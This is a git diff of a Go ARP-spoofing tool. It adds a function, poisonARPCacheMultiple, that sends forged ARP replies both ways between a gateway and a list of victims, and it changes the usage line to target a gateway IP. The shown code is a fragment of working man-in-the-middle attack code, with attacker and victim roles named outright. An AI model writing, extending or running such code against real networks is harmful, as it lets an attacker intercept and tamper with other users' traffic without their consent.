@@ -140,7 +140,6 @@ func sendARPReply(from, to *DeviceInfo, attackerInfo *AttackerInfo, deviceHandle
 	return nil
 }
 
-// TODO: test
 func getAllIPs(attackerIP net.IP) []net.IP {
 	ipnet := net.IPNet{
 		IP:   attackerIP,
@@ -166,6 +165,20 @@ func getAllIPs(attackerIP net.IP) []net.IP {
 	}
 
 	return addresses
+}
+
+func poisonARPCacheMultiple(gateway *DeviceInfo, victims []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
+	for _, victim := range victims {
+		if err := sendARPReply(gateway, victim, attackerInfo, deviceHandle); err != nil {
+			return err
+		}
+
+		if err := sendARPReply(victim, gateway, attackerInfo, deviceHandle); err != nil {
+			return err
+		}
+	}
+
+	return nil
 }
 
 func poisonARPCache(devicesInfo []*DeviceInfo, attackerInfo *AttackerInfo, deviceHandle *pcap.Handle) error {
@@ -281,7 +294,7 @@ func readPackets(deviceHandle *pcap.Handle) {
 
 func main() {
 	if len(os.Args) != 4 {
-		fmt.Println("usage: <interface> <victim1 ip> <victim2 ip>")
+		fmt.Println("usage: <interface> <gateway ip> <victim2 ip>")
 		os.Exit(0)
 	}
 
